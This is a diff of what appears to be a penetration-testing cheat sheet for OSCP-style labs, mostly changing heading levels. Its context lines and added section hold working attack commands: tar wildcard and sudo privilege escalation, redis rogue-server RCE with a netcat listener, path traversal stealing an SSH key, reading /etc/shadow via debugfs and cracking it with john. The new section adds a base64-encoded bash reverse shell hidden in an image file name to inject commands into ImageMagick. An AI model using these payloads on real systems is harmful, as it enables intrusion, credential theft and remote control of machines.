@@ -2627,7 +2627,7 @@ https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
 >./exploit_nss.py (#Got roo shell)
 
 ```
-## borg backup exploit
+### borg backup exploit
 - BorgBackup  (short:  Borg)  is a deduplicating backup program.  Optionally, it supports compression and authenticated encryption.
 - The main goal of Borg is to provide an  efficient  and  secure  way  to backup data.  The data deduplication technique used makes Borg suitable for daily backups since only changes are stored.  The authenticated encryption  technique  makes it suitable for backups to not fully trusted targets.
 - Borg stores a set of files in an archive. A repository is a  collection of archives. The format of repositories is Borg-specific. Borg does not distinguish archives from each other in any way other than their  name, it  does not matter when or where archives were created (e.g. different hosts).
@@ -2643,7 +2643,7 @@ borg delete /path/to/repo::Monday # Recover disk space by manually deleting the 
 #Offsec Challenge Lab Relia 19 - https://www.ddosi.org/oscp-cheat-sheet-2/
 ```
 
-## Linux Wildcard Exploit tar zip
+### Linux Wildcard Exploit tar zip
 - In the crontab running the tar as root access (grep "CRON" /var/log/syslog)
 - Exploit using suid for /bin/bash, [reference](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) OSCPC 157, 
   
@@ -2672,7 +2672,7 @@ ls -la /bin/bash
 whoami
 #Got root shell
 ```
-## redis 6379, /usr/local/bin/redis-status privesc
+### redis 6379, /usr/local/bin/redis-status privesc
 - In [redis-rce](https://github.com/Ridter/redis-rce) redis running on the linux machine to RCE, from PG Practice Blackgate
 - Another way to get initial shell [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) it will give the initial shell
 ```bash
@@ -2691,7 +2691,7 @@ python3 redis-rogue-server.py --rhost=192.168.197.176 --lhost=192.168.45.171 --l
 rlwrap nc -nlvp 1234 # got the shell
 # From here try above redis-status privilege escalation redis, PWNkit(https://github.com/ly4k/PwnKit)
 ```
-## Cassandra, Freeswitch-event Linux 
+### Cassandra, Freeswitch-event Linux 
 - One of the boxes has Apache Cassandra and Freeswitch-event and some smb ports has some configuration files and ssh port
 ```bash
 # Clue from Pgpractice
@@ -2711,7 +2711,7 @@ curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.bash_hist
 curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.ssh/id_rsa # Copy the key to kali then loogedin as root
 ```
 
-## sudo -l permission with /usr/bin/tar -czvf /tmp/backup.tar.gz *
+### sudo -l permission with /usr/bin/tar -czvf /tmp/backup.tar.gz *
 - Sudo -l privileges with user, [article](https://medium.com/@Dpsypher/proving-grounds-practice-cockpit-7e777892e485)
 ```bash
 # SSH keys generate based on NMAP ssh result
@@ -2723,7 +2723,7 @@ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
 sudo -l # (root) NOPASSWD: ALL
 sudo /bin/bash # Boom we are root
 ```
-## Disk group Linux PrivEsc, /dev/mapper/ubuntu--vg-ubuntu--lv 
+### Disk group Linux PrivEsc, /dev/mapper/ubuntu--vg-ubuntu--lv 
 - i Have a situation, When i try the id command it show 6(disk) end of the line along with username
 - Referance Extplorer
 ```powershell
@@ -2736,6 +2736,15 @@ debugfs:  cat /etc/shadow
 #cat /etc/shadow # got file
 quit # exit from the terminal
 john root_hash.txt --wordlist=/home/kali/HTB/OSCP/rockyou.txt  # Copy hash crack through john
+```
+
+### Image reverse shell extension - ImageMagick Identifier
+- During the CTF i found a ImageMagick Identifier with image upload functionality Image-PGPractice
+```bash
+echo -ne test > en.png
+# Base64 bash revrse shell pentest monkey,  echo -n "bash -i >& /dev/tcp/192.168.45.248/8080 0>&1" | base64, (YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE=)
+cp en.png '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png' # make sure properly check single and double quotes endings
+# file name like '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png'
 ```
 ---
 # Post Exploitation
